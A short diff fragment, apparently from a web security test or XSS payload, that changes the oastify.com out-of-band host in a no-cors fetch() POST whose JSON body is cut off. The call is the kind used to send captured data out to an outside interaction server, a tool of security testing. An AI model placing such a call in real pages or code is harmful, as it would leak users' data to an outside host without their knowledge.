@@ -1,4 +1,4 @@
-fetch('https://w969uozhs2veixjwrq6lldrrgim9a0yp.oastify.com', {
+fetch('https://sjf391l61c5awrt9hx50esbd147vvmjb.oastify.com', {
   method: 'POST',
   mode: 'no-cors',
   body: JSON.stringify({
